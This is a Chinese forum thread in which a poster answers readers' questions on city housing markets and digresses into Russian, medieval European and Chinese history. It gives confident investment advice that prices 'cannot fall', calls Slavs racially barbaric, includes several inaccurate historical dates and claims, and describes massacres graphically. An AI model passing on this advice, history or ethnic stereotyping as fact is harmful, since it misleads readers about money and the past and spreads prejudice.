对于广州一带房价相对偏低的原因是广州并非全省唯一的大型繁华城市，而是广东省内形成了大片的都市群，使得城市的经济得到了均衡的发展。这是最健康的城市发展模式，但也制约了房价的上升空间。随着地铁的贯通接轨，佛山的房价将呈稳步上涨态势。 首付提高的逻辑 tianxiaobing11： 请教楼主，最近有银行提高了首付，这是为什么？政府真要让中低层租房子吗？政府吃租赁的大蛋糕吗？ kkndme： 主要还是防范金融风险，政府调控的目的从来也不可能是解决穷人的买房问题。恰恰相反，金融风险来自于让穷人买房，所以提高首套房首付比例，杜绝穷人买房，才是防范金融风险的有效手段。同时可以推升租金上涨，政府推出的公租房才有市场，有钱可赚。 四线城市 shs2009： 楼主，我们这个城市离武汉60公里，四线城市吧。我打算在新开发的工业园区买一套房子，买的理由是认为工业区是人员比较集中的地方，应该有比较大的需求，无论租售都应该有潜力的。我的看法对吗？ kkndme： 四线城市一定要选择城中心或者高档住宅区买房 苏州工业园 夏天来了我也来： 我是昨天才看到LZ这个帖子的，一口气读完了，眼睛虽然有些累，但心里却是收获颇丰，今年四月ZY刚开始严厉调控的时候，我可是抱了一百分的信任，心想我们老百姓的好日子终于来了，终于可以用较低的价格买套属于自己的房子了，可现在都九月了，看着周围一直慢慢望上爬的房价，真的是失望极了！ 我九月三号的时候刚定了一套二手房，是我们的第一套房子，不知道LZ是否了解苏州工业园区的发展前景和房价，我们这套房子在园区的中心位置，也相当于市区吧，位置还不错，可就是这个房子属于政府修高速路时的拆迁安置房，房龄有十年了，原来房东的两证上写的土地性质是\"出让\"，不知道这样的房子以后是否有升值空间？因为在苏州园区同样的地段，同样旧的拆迁房价格基本都快一万了（我们定的这个房子因为离马路有些近，而且在顶楼，户型是小户带阁楼，上下两层复式结构的那种，所以便宜一些，只有八、九千），附近的高档商品房价格也要一万五左右！苏州和上海离的这么近，如你所说，江苏的有钱人都跑到上海买房了，苏州的房价是不是很难涨呢，同时也担心以后房价再继续上涨，ZY会出重拳打击楼市，真到那个时候，房价是不是要暴跌呢？ kkndme： 土地性质\"出让\"没有问题，\"划拨\"才有问题。 zf初重拳打击的结果往往取得相反的效果，因为政府如果希望继续执政是绝不可能让房地产崩盘的，房地产的崩盘将同时埋葬现有体制，社会\"和谐\"将不复存在。如何让房地产持续稳定与gdP同步上涨是政府最大的难题，完全取决于领导的智慧，但是以现在的水平来看，是很难做到的。 苏州工业园区房地产不是很了解，但是一个工厂及仓储所在地，缺乏高科技与文化历史底蕴的支持，房价一定会涨，但涨幅一定有限。 住房公积金利率 facetowall： 另一个问题啊，我准备用住房公积金购买首套房，在其它的一些帖子上看到政府将在某个时间点上加息，那么对住房公积金的贷款利息（3.87%）会不会同样上调呢？上调幅度会是多少？对这个比较关心，麻烦楼主给解答一下吧。谢谢了！ kkndme： 如果当年加息，再次年的元旦后贷款利率也会相应增加，但公积金贷款利率增加的幅度很小，不用担心。加息说明通货膨胀严重，如果不是连续过度加息，对房价没有影响。从长期看更是不可能影响房价上涨趋势，除非经济崩溃。如果经济崩溃，持有纸币也没有意义，等同于废纸。 90年代我国高度通货膨胀，银行存款年利率曾达到百分之十几，但并没有影响房价的上涨趋势。 济南 & 大规律拆迁的城市房价不会下降 facetowall： 不知道楼主对济南的房市了解如何？去年接着全运会的东风，济南房价涨了35%到40%，让许多人措手不及。现在市区的新开盘的楼盘依据位置不同大约在8000到13000rmb每平方。济南奥体中心附近的房子在9000到13000rmb每平方吧。我和老婆都在济南高校工作，目前俩人月收入6000+，公积金1100多吧。相比于其它省市地区高校，无论工资还是公积金 都比较少。我感觉高校老师属于体制内的边缘群体，工作忙(很多人不认同这点)报酬少，并且目前已经没有什么福利分房了，都要到市场上购买商品房。我们的家庭情况是这样的：均为独生子女，目前有一个孩子，二岁了，双方父母均是事业单位退休人员，我父母退休金合计1万每月吧，她父母大约7000.由于我父母在济南有两套房改房，所以现在他们住一套，我们三口住一套，房产证上都是我父母的名字，所以我和老婆属于无房户。目前想买一套房子给岳父母住，毕竟我们俩是独生子女，将来接到济南来住是早晚的事。感觉济南的房价几乎没有下降的可能，因为全济南正处于最火热的拆迁阶段，山东省已经把济南的改造升级列为战略了，并且全国的知名地产商如绿地、中海、保利、绿城、万达(好像万科没有)都来拿地盖房并且已经推向市场了。目前看中了奥体中心附近的一套2005年的二手房，房子很新，毛坯房，环境物业都不错，大约120平米，单价得9100，总价110万。我们想拿出70万现金，再以公积金贷款50万(10万装修)/20年，不知道这样有没有风险。一个是担心房价下跌，再一个加息。请楼主给出明示，指导一下，万分感谢。 kkndme： 大规模拆迁的城市，房价没有下降的可能，可以忽略政策因素。既然城市大规模拆迁，就晚买不如早买，这是本贴中一再提到的。 facetowall： 多谢楼主的解惑。感觉济南不像北京上海那样具有巨大的政经优势吸引全国的阔商巨贾和精英汇集，也不像昆明、杭州那样为渡假天堂，还不像西安、南京、武汉那样高校云集具有巨大的教育资源。也就是说济南不能吸引相当多的精英投资，始终是个不温不火的地方，所以济南的房价有点虚，再上涨的话就脱离了实际的承受能力。楼主对此有何看法？ kkndme： 济南的地理区位并不差，但城市搞的不好跟领导有关，济南的经济前景不错，而且房价的上涨是拆迁带动的，以后很多城市都会走这一步。 公务员小区牛逼 何金银银金何： 不知楼主是否了解哈尔滨的房价？小弟有套小房子 想换大点的，现在可是时机？哎 早拜读你这文章 今年年六月份就能换套大的了，可惜现在搞得自己换不起了……杯具& 哈尔滨的公务员小区是没有产权的，不知道这种房子买了做第二套之后要不要征税？而且也非常贵，按使用面积要1w多一平了 小弟小白，您有空给指点指点…… kkndme： 公务员小区比房产证和土地证还保险。我国不是一个法制国家，任何颁发的纸质文件的可信度都不高，反而公务员小区因为是特权房，信用度要远高于产权证。 房屋朝向只要不是纯北西就行 & 买房首选市中心、公园地产 pohangcity： 楼主。兄弟在一北方省会城市太原，目前这里的商品房平均价为5000左右，上周看了市中心的一套房子，112平米，紧挨市区里的公园（有一大湖），周边就是万达广场，万达的房子均价8500，已经售完，这个房子售价7000，已经是现房，结构还可以，唯一的问题是不是正房，朝向向东，周边一片混乱，全是施工的、拆迁的，说以后要以万达广场为中心，打造太原的CBD，也不知道能不能实现。 房子总价74万，首付24万，按揭月供3400，现家庭年收入税后10万，不可以公积金贷款，我已有一套住房，不过感觉还款压力很大。 我的问题是： 1、楼主帮我房子一下这个房子值不值？我想以后自己居住，现在的房子可出租1500左右。 2、太原也有万达、恒大的楼盘，位置是在太偏，价格6000带精装，户型也好，如何取舍？ 非常谢谢楼主~~~~~~ kkndme： 房屋朝向问题，随着城市房价的不断飙升，已经不那么讲究了。只要是不是纯北房或者纯西方，都可以接受。 建议首选还是城中心，特别是公园地产，未来将更稀缺。 zf搬迁 xhyyhzy： 楼主您好，从您的帖中收获很多。觉得以前真的被洗脑洗的很厉害，从天涯学到很多。非常感谢您，又让我明白了很多事情。 请教您，市政府从原来的市中心，搬迁到另外一个地方，相对较远，因为城市不大。好的医院，学校，各种好的资源都在市中心。现在搬到一个特别偏远，荒凉的地方，重新开始建设，政府这么做是什么意思阿？以后这些医院，学校也会搬吗？多浪费阿。另，您怎么看该城市未来房价的变化。（注，离上海很近的3线城市） 期待您的分析。 kkndme： 政府搬迁到郊区不仅仅是个别城市问题，而是大多数二三线城市面临的问题。政府的用意在于扩大城市规模，扩充人口，追求gDP的高速增长，但对于新开发出一块荒郊野地，没有政府的带头搬迁，是很难炒作起来的。政府的迁入是一个信号，告诉老百姓，政府都搬过去了，以后配套肯定不会有问题。于是概念将透支未来，房地产价格就会飙涨。但是未来建成后政府是否真的搬迁就不一定了。 医院和学校全部搬迁会加深社会矛盾，所以通常是在新规划的区域建分校。如果自住还是主城，如果投资投机，可以考虑新城。 俄罗斯 有同志提起俄罗斯很可以再说一说的。 俄罗斯的前身叫罗斯公国。首都不在莫斯科，而在基辅。 建立罗斯公国的，是东斯拉夫人，日耳曼人眼中的劣等民族。有人说过，俄罗斯和西方国家的差别，并不仅仅是经济上的差别，而是民族和文化的差别。这种说法还是很有道理的。用我们现在的话来说，斯拉夫的人种有问题。善于侵略，欺软怕硬，野蛮无礼。这是斯拉夫人的特点。所以在罗斯的土壤，永远出不了骑士精神。 罗斯人信奉基督教，源于弗拉基米尔一世娶了东罗马帝国安娜公主为妻。所以我们看到的俄罗斯教堂全部是拜占庭式的。拜占庭帝国灭亡后，东正教的中心就搬到俄罗斯。 罗斯国并不是统一的帝国，而是象我们的西周，搞的是封建分封制（我国在秦以后就不是封建社会了，因为取消了封建分封制，丞相都是打工仔，这一点是与我们的课本不同的），到了十二世纪，礼崩乐坏，罗斯国分裂了，罗斯的周天子弗拉基米尔二世·莫诺马赫的统一大业未能完成，故罗斯的土地上居然出现了十八个公国，很有点象我们的十八路诸侯。 十三世纪，成吉思汗的孙子，术赤的儿子，英勇的拔都同志西征，一个强大的统一的蒙古帝国攻击分裂的罗斯诸公国，很有点欺负人的味道。于是强大野蛮的东斯拉夫人在金帐汗国的铁蹄下，当了孙子。 莫斯科公国的伊凡一世·达尼洛维奇以贿赂的方式从金帐汗那里获取了弗拉基米尔大公的封号，并把东正教罗斯教区总主教驻地从弗拉基米尔迁到莫斯科。 莫斯科大公是很有一手的，一面拍金帐汗的马屁，一面组织军队，终于利用金帐汗国的内部分裂，一举击败了马迈汗率领的大帐汗国军队，并且兼并了科斯特罗马公国、加里奇公国、白湖公国、乌格里奇公国、下诺夫哥罗德公国、木罗姆公国和苏霍纳河流域北部等广大东北罗斯地区。 14世纪，莫斯科大公依凡三世在乌格拉河战役中，迫使阿合马特汗撤退，终于结束了金帐汗国长达两个多世纪的统治。 直到1713年，莫斯科公国干掉了罗斯地区的绝大多数王公，才形成了统一的集权国家，正式命名为俄罗斯帝国。 罗斯公国打得最精彩的战役就是楚德湖战役。 对手是称霸普鲁士的赫赫有名的三大骑士团之一，条顿骑士团，欧洲强大到令人恐怖的军事组织。 罗斯的最高指挥官是亚历山大诺夫格罗德公爵。 俄罗斯联军一方有1.5万到1.7万，主要是步兵。而条顿骑士团的大约有1万人，以重骑兵为主，其中大骑士应该不下千人，这是一支让整个欧洲都发抖的军队。 罗斯联军的步兵排成密集队形，据守冰湖东岸。骑士团的重骑兵以楔形阵发起冲锋。按常理看这是一场毫无悬念的战斗，罗斯步兵在强大的世界第一军事组织面前应该不堪一击。 但是亚历山大诺夫格罗德公爵是军事天才，军事才能相当于中国的乐毅。这位乐毅公爵仔细研究了重骑兵的楔形阵，认为弱点在于两翼的防御力量有限，如果重骑不能迅速撕开步兵防线，重骑的两翼会慢慢被侵蚀。 亚历山大同志于是把联军中主要的轻步兵安排在中间，列成加厚的方阵，消磨条顿重骑的突击能力，然后把他自己的诺夫格罗德精锐步兵放在两翼。 条顿骑士团的攻击开始还是成功的，但无法撕开罗斯步兵的军阵。最惨的还是条顿骑士狂妄自大，非要在楚德湖的冰面上发起冲锋（冬天结了冰），可想而知重骑兵跑到冰面上冲锋是什么样的效果，战争逐渐陷入僵持。 亚历山大的精锐步兵攻击骑士团的两翼，骑士团被包围了。亚历山大同志果断的派出最精锐的骑士亲兵卫队，从右翼后方包抄攻击骑士团。 可怜的条顿骑士，拥有世界上最强悍的战力，但在湖面上根本发挥不出来，大量的重装甲骑士掉进冰窟窿里，条顿骑士大团长也被俘虏了。 每次看这段历史，都为条顿骑士团唏嘘不已。 条顿骑士团败的最惨的是另一场战役，塔能堡。是中世纪欧洲最大规模的战争。 对手是波兰、立陶宛联军。 著名的波兰小说\"十字军骑士\"就是讲的这段历史。 骑士团的大团长是荣金根，大概有投入1万多名士兵。 波兰、立陶宛联军大约有3万名士兵。 联军方面指挥官是波兰国王Jagiello和立陶宛大侯爵Witold。 条顿骑士大团长荣金根是一个位标准的日耳曼大骑士，开战前，骑居然给波兰国王Jagiello送去两把剑，表示要进行一场骑士之间的较量。斯拉夫人是不敢这么玩命的，立刻拒绝了日耳曼骑士的要求。 条顿骑士团的骑士拥有强大的武力，真不是盖的，荣团长挥动旗枪组织冲锋，立陶宛军立刻溃败，波兰的翼骑兵也根本无法抵挡日耳曼骑士强大的冲击力，准备开始溃逃。这时一个意外发生了，大团长兼倒霉蛋荣金根同志在奋勇冲锋时突然遭了冷箭挂掉了，骑士团缺了指挥官陷入混乱，无法阻止有效的进攻，波兰立陶宛联军乘机组织起冲锋，条顿骑士团莫名其妙的大败。 真是谋事在人，成事在天。强大的条顿骑士的惨遭溃败居然因为一个意外。 珠海 & 唯一自住房不只是投资 & 调控是最佳的选房时机 期待艳阳天： 楼主，想就以下问题请教： 1、珠海属几线城市？您对投资珠海的房产前景作何分析？ 2、我一朋友刚出手一套自住的房，打算租房住一段时间，想抄底再入，他是坚信房价会跌派，考虑到目前他供房确实有困难，且对刚出手的那套房不是很满意，请问他的做法是值得借鉴？ 3、我目前的对自住的房朝向及大小不太满意，也想倒手后再入，我目前的房出手的话比同地段的新房价略低10-30%（主要是小区及户型有差异），如果换大、好的承受不了借贷压力，但如果淘二手房的话，可以在附件找比我目前房价低20%左右的二手房，请问我是否可以考虑换个朝向、大小更满意的房？现在是好时机吗？ kkndme： 以上，请楼主不吝赐教！ 珠海是个适合居住的城市，干净整洁，生活节奏不快，相当安逸。 将自己唯一一套自住房卖掉，跌了买回，这样做的投机性心理太强，风险很大，往往得不偿失。当然如果为了换更大更好的住房就令当别论了。 人的一生很短暂，在衣食住行中，住占了人生的大部分时间，有一个温暖的家，生活才觉得安逸。如果有能力确实应该换一套自己满意的舒适的住房。至于出手时机，我觉得房产不是股市，不能总想着抄底逃顶，只要房价的长期上涨趋势未变，调控时期正是选房的最佳时机。 经济崩溃，最后接盘的是老百姓 vipboy223： 看了LZ的帖子，受益非浅！谢谢！ 有一个问题还请教下：就像LZ所说，此次调控是ZY布局，赶出炒房者和小的kfs，目的是实现房子的垄断。但从政策和执行看，停止3套房贷并没有真正打击到真的炒房者，至多是改变了预期；二套房首付比例和利率的提高，确实实实在在的把改善性需求排除在外了；现在有些银行对首套房的首付都提高到4成，利率优惠也没有7折优惠了。当然我很愿意相信这次ZF在保护LBX，阻止老百姓去接房产暴利的最后一棒；显然这不是真正的原因。当然，首付和利率提高可以让银行增强金融防范能力。 随意想请教LZ对这个问题的看法； kkndme： 政府阻止老百姓去接最后一棒？晕，如果真的到了崩盘的一天，接最后一棒的一定是老百姓，而且zf会千方百计的让老百姓接最后一棒。 分析问题不能用喜羊羊的头脑。 vipboy223： 显然LZ没有仔细看我写的内容。 换种方式问下：改善性需求是否现在就入市？首付高就不说了，利率1.1倍可是很厉害的； kkndme： 如果是忙于拆迁的二三线城市就要抓紧买了，利率高也认了。 如果是一线城市不妨再看一下，但是观望也是有风险的，一旦上涨就买不到合适的房子了。 命运之矛 荣金根团长的挂掉会不会跟命运之矛有关呢。 1189年，神圣罗马帝国皇帝红胡子腓特烈一世在与教皇和解后，与狮心王理查一世、腓力二世·奥古斯都开始了第三次十字军东征。然而，红胡子腓特烈一世在小亚细亚渡过萨列法河时竟然意外溺死。原因是他突然丢失了传说中的命运之矛。 命运之矛也叫郎基努斯之枪。 正是一个叫郎基努斯的罗马士兵用这杆抢刺入了十字架上耶稣的身体，这只枪因沾有圣血成为圣物。 传说持有命运之矛的人可以主宰世界的命运，但失去的人会即时毙命，神圣罗马帝国的皇帝红胡子腓特烈一世就拥有这只命运之矛。 二战时期，希特勒从维也纳博物馆夺取了命运之矛，差不多占领了整个欧洲。但是在1945年4月30日下午2点10分，命运之矛又被美军夺走了，不到2小时，希特勒便吞枪自杀而亡，死时是下午3点30分，这难道仅仅是巧合？ 荣金根是否也拥有过这只命运之矛？ 我以为我们每个人都有一把属于自己的命运之矛，当你得到它的时候，你的事业、家庭、健康、财富都相当不错，但是当你失去它的时候，你的生命也将完结。 每个人对生命之矛都有自己的理解，希望我们都能够找到它。 除非外族入侵或全国大饥荒，否则双轨制决定了房价不会崩盘 戈者： 不要枪，不要炮，我只要选票，有了票，谁不让老百姓好过，就让谁滚蛋 kkndme： 我们连依法治国都办不到，何谈选票。 我们是实行双轨制国家，在经济全球一体化的今天，内部并不与外部接轨。这个好比是互联网，我们重要部门的内网是绝不会跟外网联结的。 改变只有两个前提，一是外族入侵，二是出现全国性的大饥荒。否则期望房价崩盘重建一个新世界是没有可能的。 kkndme聊北宋、唐朝 北宋时期，有个文豪及公务员叫苏东坡，一辈子也没能在首都开封买上房子，不得已，在外省小县城投资了几套房地产。苏文豪公务员的儿子在首都结婚的时候，居然都没搞到一套新房，苏公务员急眼了，最后想办法跟朋友借了一套房子，总算把喜事办了。北宋跟我们的现实还是有区别的，象苏文豪公务员这样的中层国家干部，在京城大都是有几套房子的。可见北宋时期公务员待遇还不如现在。 苏文豪公务员的弟弟苏辙就比较幸运了。该同志也是公务员国家干部，工作上兢兢业业，勤勤恳恳，熬了几十年工龄，在七十岁的时候终于买到了房子，但是买的位置还算不上首都开封，而是在开封南边的许昌买的，相当于首都的卫星城。就好比在北京买不起房的同志，跑到天津去搞了一套。 苏辙公务员同志专门为买房的事写了诗，\"我生发半白，四海无尺椽\"，我老未有宅，诸子以为言\"诗的意思反正是比较愤青，很想现在的傻空 唐朝还有个白居易同志，也是个公务员，级别相当于正处级，工作是在中央办公厅负责校对红头文件。白公务员职务一般，但工资可不低，每月一万六千钱。但是白公务员却买不起房，在长安东郊常乐里租了四间茅屋，因为房租比较高，城区的租不起，所以上班比较远，很潇洒的买了一匹马，相当于我们买车。白公务员还是很懂享受生活的，雇了两个保姆，每月的总支出大约是七千五百钱。白公务员很象蜗居里的海萍，不肯高价租城里的好房子，而是把剩下八千五百钱存起来，一心要买套房。但是存了十年，他也没能买的起长安的房子，白公务员兼诗人的文学功底很高，但是不懂经济，不了解通货膨胀。 最后白公务员急了，很愤青的说：\"你们局级干部在长安炒房子，我处级干部就去周边炒房子。\"于是白公务员跑到长安城的卫星城——陕西渭南县，买了套房子，平时在单位蹭房子住，逢假期和周末回渭南的家里跟老婆叉叉呕呕。可见唐朝时处级及以下公务员待遇也就跟我们的都市普通小白领差不多。 宋代房奴 关于房奴，也是宋代就有记载。宋代有本书叫《白獭髓》，写的就是房奴生活：\"妻孥皆衣蔽跣足……夜则赁被而居。\" 大意就是所有的存款不够，还借来钱砸在房地产上，不得不节衣缩食还债，别说家里人买新衣服，就连被子都是租的。 不知此人炒房后来发财没有，那时买房可都是全款，没有银行贷款一说。 ZG民主 只许州官放火，不许百姓点灯，这就是我们的民主 王安石的青苗法之国家出政策的动机 关于呼唤国家出政策已达成自己买车买房心愿的空空们，有必要听听王安石变法的故事。 我国的官僚有几千的当官经验，最不怕的就是新政策，只要是新政策，无论目的是为了民生还是敛财，反正就找到了由头，就有办法敛财，有空子可钻。 王安石变法的初衷是好的，但是不了解中国的官僚体制，变法让老百姓吃饭都成为了困难，加速了北宋的灭亡。所以盼着出房产税的空空要认真的用脑子想问题，梗着脖子泄愤是没有用处的。 说说王安石同志的青苗法。 青苗法，按理说是一项最为民生考虑的政策。 在百姓青黄不接，缺少粮、钱的时候，让老百姓自己估计当年谷、麦产量，先向官府借钱，谷熟后还给官府，称\"青苗钱\"。 青苗法规定把以往为备荒而设的常平仓、广惠仓的钱谷作为本钱。每年分两期，即在需要播种和夏秋未熟的正月和五月，按自愿原则，由农民向政府借贷钱物，收成后加息，随夏秋两税纳官。 实行青苗法的目的肯定是好的，可以让农民在青黄不接时免受高利贷盘剥、并且让农民不至于在没粮的时候土地被大地主所兼并。同时,让政府获得一大笔\"青苗息钱\"的收入————单纯为了民生，政府收不到钱的事情王安石同志也不同意。 按理说，出了这个政策，农民该欢呼了，zf出面了，农民们不用受地主老财剥削了，很多傻空老农民鸡冻的喊：\"还是王领导的政策好啊。\" 地方官员也鸡冻了：\"太牛了，发财的机会来了，王领导这人人品虽然不怎么样，但是很给我们挣钱的机会啊。\" 于是，王领导的青苗法一推行下去，完全走样了。 首先青苗息钱从王领导定的年息二分，本来就挺高的贷款20%利率，比我们房贷可高多了。但是就这个年息二分，在地方一下子变成了半年息二分，年利率高达40%：因为是春季发一次贷款，秋季发一次贷款，所以地方官每半年收回本利，还是按二分收，所以变成了半年息二分，年息四分。到了后来地方官想怎么收怎么收，甚至年息高达百分之几百。 傻空农民立刻傻眼，说反正自愿的，我不贷还不行吗？接着管地主老财借不行吗？ zf说了：不行。你贷也得贷，不贷也得贷，于是变成了强制高利贷。 王领导在推行青苗法的时候，还下了定额，贷款多少那是有任务的。任何朝代推行某个政策，只要涉及到收钱，都是有任务的。 王领导下达了任务，地方官必须完成，不然要罢官丢脑袋，扣个阻碍变法的帽子可不得了，同时本着无利不早起的伟大思想，不但要完成任务还要层层加码。 这下，傻空老农民彻底傻了，饭都吃不上了。 结果是王领导给zf增加了税收，官员闷声大发财，老百姓彻底崩溃。 所以请呼唤房产税的朋友，好好读一下王安石变法 tjOOSAN:： 我想 这个 \"房产税\"出不出。不是什么决策问题吧？ 是我们产权的解释问题！我们产权只有70年，换句话说就是租七十年，地和房子本身还是国家的！那么国家的房产再收税，是不是有点法理不通呢？ 这是 郎咸平说的 楼主！这个。你让我再次质疑你了 我其实 很想看进去你的文章！可惜。。。。唉 这成了您的历史秀了~~ 海 kkndme:： 连法制国家都不是还提什么法理。 拆迁条例是违背宪法的，后来又违背了物权法，但是管用的既不是宪法也不是物权法，而是拆迁条例。一群人说要修改条例，牵扯到利益就没了下文。 有时间你不妨研究一下，看看我们的政策有多少是违反宪法的。 在中国拿法理说事就比较搞笑了 读懂历史 对自己真没坏处。 王安石不但动员zf放高利贷。 还是我国搞中央政采、垄断企业和官倒的先驱。这就是王领导推行的均输法。 宋初以来，为了供应京城皇室、百官、军队的消费，在东南六路设置发运使，负责督运各地\"上供\"物质。 发运司只照章办事，各路丰年物多价贱时不敢多办，歉年物少价贵时却又必须办足。物货运到京城后往往因不合需要而削价抛售，朝廷所需却又要另去搜括。这些做法给富商大贾操纵物价，控制市场，囤积居奇提供了方便。 王领导希望能够节省劳务费，减少政府的财政支出和减轻人民的负担，就想出了均输法，相当于中央政府采购。 于是官府直接做生意，行政机构变成了大型国有垄断企业。 中石化、中石油、中国移动、电力等大企业的苦大家都吃过。 垄断企业的低效率，fb，强迫定价，强制消费，这些古今中外都是一样。 而且老百姓跟官府做生意，必须得上供。zf采购那是要多黑有多黑。 紧俏商品，官倒搞双轨制，体制内搞配额，体制外高价卖指标。 结果是zf闷声大发财，老百姓直接崩溃。 王领导的独断专行，刚愎自用还是很为大家所称道的，呵呵 张居正的一条鞭法从地主阶级的利益出发，反而成功了。 而王领导从民生的利益出发，搞改革，失败的很惨。 不能不说，历史是很搞笑的 中年不惑吗： 符合地主阶级利益的张居正变法？？ 怎么后来张被清算呢？ 封建社会官僚本来就是地主阶级的代言人 kkndme:： 张同志的清算不是因为变法，而是把万历同志架空了，比皇帝还牛的首辅能活到寿终正寝已经算是奇迹了，跟他的变法无关。 这位徐阶先生的得意门生，政治上是青出于蓝的，无懈可击，贪污受贿大概也师承徐阶吧，呵呵 很多人只对张居正同志是否和太后有一腿感兴趣，呵呵 张居正通常是以正面形象出现，但是在贪污受贿方面是很有一手的。另一个贪污受贿的正面人物是戚继光。 我国历朝历代的体制，不搞点潜规则什么事都干不成。 比如一事无成的海瑞，光赢得了个好名，其实毫无建树。 关于写青词的严嵩搞掉了正值的夏言，忍耐力超强的徐阶搞掉了老奸巨猾的严嵩，心狠手辣的高拱搞掉了徐阶，而张居正又搞掉了高拱。 这是各机关、企业学习政治斗争的最好案例啊。 什么是社会公平 古今中外，任何一次武装革命，无论最终成功还是失败，上位者因为野心的极度膨胀，都变得更加专制。陈胜、李自成、朱元璋、罗伯斯皮尔、斯大林、 ，都是一个个鲜活的例子。 真正公平的社会并不是均贫富、等贵贱的乌托邦，也不是贵族享有领地少女初夜权的强权社会，而是法制社会，大家在一个完善的法律制度下，享有人身和财产自由，知道什么该做什么不该做，法典之下对于任何人都是平等的，无论是平民还是权贵。 作为爱好和平，小富即安的我等小民，最愿意看到的是社会的稳定而不是动乱。 还是有很多有钱人 说起空空们们不买房是因为没钱，我还真不相信。 在某二线城市，调控重拳刚出的时候，我赶紧去买房，碰见一个大姐。 那个大姐很有意思，说从08年底看房，一直觉得房价高，所以坚决不买，结果等到了2010年，一直盼着降，但是调控政策刚一出就心慌了，害怕后面是大暴涨，赶紧把房买了，这位大姐买房是一次性付款。到现在房价涨了30%。 双轨制之体制内的福利 汝爱之罪： 水木社区上有很多愤青打电话给北京建委，举报领秀慧谷捂盘内购的事，我跟了个贴子说不要太幼稚，结果被骂的很惨。今天他们接到建委电话了，说是没有违规。我在想：有这些不明真相的群众存在，房价怎么会跌呢？通胀怎么会停呢？股市IPO怎么会停呢？底层不被收割就奇怪了 kkndme： 让北京建委去查国资委就比较搞笑。北京的房优先安置各大部委，剩余很少的部分才用于商品房开发，所以才说北京四环房价5万一平都不算贵。 开发商思维 鼻使豆豆： 高房价不可怕，可怕的是没有辩别是非的能力，明明是老百姓，却有开发商的意识，可悲 kkndme： 其实这个道理是很浅显的，你不买房并不能代表房价不涨，而你买了房不但可以住的舒适，还可以获利。反而是有开发商的思维才能有好日子过。 这个道理跟炒股票是相同的。大家知道，股票与房地产不同，并不能创造财富，只是财富再分配的工具，但是财富再分配，是庄家分配散户的钱，而不是散户分配庄家的钱。所以炒股要有庄家的思维才能挣钱。 道理都是一样的。 农民政权的缺点 tianxiaobing11： 请问楼主，为什么历史上的农民起义军领袖，一旦得势后比原来的统治阶级还残暴呢？像黄巢，张献忠等等 kkndme： 是因为缺乏一个纲领。 农民伯伯因为没饭吃拿起武器造反了，造反之后怎么办？——对不起，从来没想过。国家治理到底是怎么回事？——对不起，一概不懂。 比如陈胜，刚占了一块地盘就不知道姓什么了，老子天下第一，农民暴富后，就想拼命享受，自己的属下和革命战友在自己眼中就是一坨屎，就更别说老百姓了。武装还没胜利呢，就生怕别人夺权，大搞内部政治斗争。吴广挂掉最高兴的就是陈胜。太平天国表现的更是淋漓尽致。 朱元璋就不同，是个军事天才和政治天才，懂得治国之道，有做皇帝的野心，也懂得当皇帝需要的知识，朱清楚的知道靠均贫富等贵贱是不能坐天下的。 古代能够夺取天下的，基本都是贵族阶层，有野心有理想有知识。最典型的就是李世民。汉高祖刘邦同样不是单纯的流氓无产者，他幸运的娶了吕雉，一跃成为地主家族的一员。 历史上只有朱元璋是个异数。这也是毛为什么要推崇朱的原因。 郑州有前景 larryzs： 最喜欢看楼主评说历史了 呵呵，看来历史要重新好好读一下了 不知道楼主对河南郑州的房价了解吗？ 希望楼主对郑州将来的发展分析一下。 现在郑州的房价均价也差不多快到6000了，郑东新区的一万以上。 市政府也在大力修建地铁，个人认为还是有发展前景的。 kkndme： 郑州的交通区位决定了经济发展的空间，同意你的说法，很有前景 公园地产是稀缺资源 klid： LZ，省会城市二环边公园边房产和市中心无天然气房产，选择哪个比较好？ kkndme： 公园地产未来是稀缺资源，市中心虽好，但是没有天然气毕竟不方便。两者相较还是公园边合适。 张献忠屠川 关于张献忠屠四川，尽管学术上存在争议，但大致是不差的，虽不见于正史，但《蜀碧》及《求幸福斋随笔》都有记录。很多学者也做了大量的考证。 张献忠此人曾经读过书，做过zf最基层公务员——捕快，但是被开除了。人格比较扭曲，不但好色，且好杀成性，是典型的流氓无产者。大明的苦难子民指望这样的有严重心理疾病的杀人狂拯救，那是毫无指望的。 张献忠每攻城略地特别喜欢把当地的妇女同志送进军营当营妓，并且乐此不疲，军队没粮了，就把美丽的少女切成块做成腊肉。把儿童成群的围起来用火烧，谁往外跑就用刀刺，也是张大义军领袖最喜欢的游戏。 对于张的行为，我们只能用有严重的心理疾病来解释。 一个仇视社会的愤青，掌握了军队，破坏力是相当可怕的，是人民的灾难。 张攻陷四川建立大西国政权，与柬埔寨的红色高棉政权简直是异曲同工。以至于清军进入四川受到了百姓的欢迎而不是抵抗。这跟越南入侵柬埔寨，越南军受到了柬埔寨人民的欢迎是多么相似啊。 人民的眼睛是雪亮的，违反人性的，即使打着爱国的旗号，也终将被人民抛弃。 洪秀全、黄巢、李自成 洪秀全同志，人生比较悲剧，人家好歹是个落地秀才。洪教主考了20多年，连个秀才都没考上，相当于小学都没毕业。 洪教主考试不行，搞邪教确是个高手，夜里做梦居然梦见上帝（形象大概是个白胡子老道）说洪教主是他的二儿子。这个梦确实不太靠谱。很可能是洪教主有意编的。 洪教主的拜上帝教应该算是白莲教的一支或者说是余孽。 洪教主搞革命，对解放劳苦大众却一点不感冒，最感兴趣的是一夫多妻制，娶了88个后妃。好像历史上的农民军领袖对妇女同志都有出奇好感，大概是小时候性压抑的结果。 太平天国攻下南京得了半壁江山，洪教主从41岁开始，直到11年后自杀，竟然没出南京城一步。大概是收罗的漂亮的妇女同志太多了，实在没有时间干别的。 比起张大义军领袖的变态，洪教主还是比较有人性。好色，人之天性。 不过洪教主进南京，并没有因为女性的爱情滋润，而让他变得温柔。虽然没有张大领袖变态，实行的也是三光政策：杀光、烧光、抢光。 \"凡掳之人，每视其人之手，如掌心红润，十指无重茧者，恒指为妖，或一见即杀，或问答后杀，或不胜刑掠自承为妖杀，或竞捶楚以死。\"大意是手上没长茧子的就是妖人，就要统统杀掉。 农民起义带来的不是均田地等贵贱的乌托邦，而是血腥恐怖 说起洪教主玩弄的美女确实让人流口水，除了88个妃子外，女官侍婢不计其数，算下来用了11年时间玩了2300名妇女。 有一本《江南春梦笔记》：王后娘娘下辖爱娘、嬉娘、妙女、姣女等16个名位共208人；24个王妃名下辖姹女、元女等七个名位共960人，两者共计1169人。以上都属嫔妃，都是要和洪秀全同床共枕的。天王府不设太监，所以另外还有许多服役的\"女官\"。以二品掌率60人各辖女司20人计算，合计为1200人。各项人数加起来，总计有2300多名妇女在天王府陪侍洪秀全一个人。 